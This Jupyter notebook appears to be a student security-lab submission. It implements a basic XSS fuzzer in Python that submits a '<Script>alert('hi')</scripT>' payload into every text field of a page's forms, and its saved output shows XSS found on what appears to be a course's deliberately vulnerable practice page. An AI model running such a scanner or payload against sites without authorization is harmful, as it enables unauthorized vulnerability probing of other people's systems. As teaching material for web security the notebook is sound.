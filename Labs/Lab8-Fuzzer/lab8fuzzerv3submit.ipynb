{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "applicable-yugoslavia",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/Users/murtuzasayeed/bs4/element.py:15: UserWarning: The soupsieve package is not installed. CSS selectors cannot be used.\n",
      "  warnings.warn(\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from pprint import pprint\n",
    "from bs4 import BeautifulSoup as bs\n",
    "from urllib.parse import urljoin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "nuclear-wireless",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_all_forms(url):\n",
    "    soup = bs(requests.get(url).content, \"html.parser\")\n",
    "    return soup.find_all(\"form\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "abandoned-canvas",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_form_details(form):\n",
    "    details = {}\n",
    "    action = form.attrs.get(\"action\").lower()\n",
    "    method = form.attrs.get(\"method\", \"get\").lower()\n",
    "    inputs = []\n",
    "    for input_tag in form.find_all(\"input\"):\n",
    "        input_type = input_tag.attrs.get(\"type\", \"text\")\n",
    "        input_name = input_tag.attrs.get(\"name\")\n",
    "        inputs.append({\"type\": input_type, \"name\": input_name})\n",
    "    details[\"action\"] = action\n",
    "    details[\"method\"] = method\n",
    "    details[\"inputs\"] = inputs\n",
    "    return details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "colonial-accused",
   "metadata": {},
   "outputs": [],
   "source": [
    "def submit_form(form_details, url, value):\n",
    "    target_url = urljoin(url, form_details[\"action\"])\n",
    "    inputs = form_details[\"inputs\"]\n",
    "    data = {}\n",
    "    for input in inputs:\n",
    "        if input[\"type\"] == \"text\" or input[\"type\"] == \"search\":\n",
    "            input[\"value\"] = value\n",
    "        input_name = input.get(\"name\")\n",
    "        input_value = input.get(\"value\")\n",
    "        if input_name and input_value:\n",
    "            data[input_name] = input_value\n",
    "\n",
    "    if form_details[\"method\"] == \"post\":\n",
    "        return requests.post(target_url, data=data)\n",
    "    else:\n",
    "        return requests.get(target_url, params=data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "binding-bradford",
   "metadata": {},
   "outputs": [],
   "source": [
    "def scan_xss(url):\n",
    "    forms = get_all_forms(url)\n",
    "    print(f\"[+] Detected {len(forms)} forms on {url}.\")\n",
    "    js_script = \"<Script>alert('hi')</scripT>\"\n",
    "    is_vulnerable = False\n",
    "    for form in forms:\n",
    "        form_details = get_form_details(form)\n",
    "        content = submit_form(form_details, url, js_script).content.decode()\n",
    "        if js_script in content:\n",
    "            print(f\"[+] XSS Detected on {url}\")\n",
    "            print(f\"[*] Form details:\")\n",
    "            pprint(form_details)\n",
    "            is_vulnerable = True\n",
    "    return is_vulnerable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "portable-cancer",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Detected 1 forms on http://www.cs.tufts.edu/comp/120/hackme.php?token=Foodler.\n",
      "[+] XSS Detected on http://www.cs.tufts.edu/comp/120/hackme.php?token=Foodler\n",
      "[*] Form details:\n",
      "{'action': 'hackme.php',\n",
      " 'inputs': [{'name': 'price', 'type': 'hidden'},\n",
      "            {'name': 'fullname',\n",
      "             'type': 'text',\n",
      "             'value': \"<Script>alert('hi')</scripT>\"},\n",
      "            {'name': 'beverage', 'type': 'radio'},\n",
      "            {'name': 'beverage', 'type': 'radio'},\n",
      "            {'name': 'beverage', 'type': 'radio'},\n",
      "            {'name': 'beverage', 'type': 'radio'},\n",
      "            {'name': 'submitBtn', 'type': 'submit'}],\n",
      " 'method': 'post'}\n",
      "True\n"
     ]
    }
   ],
   "source": [
    "if __name__ == \"__main__\":\n",
    "    url = \"http://www.cs.tufts.edu/comp/120/hackme.php?token=Foodler\"\n",
    "    print(scan_xss(url))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
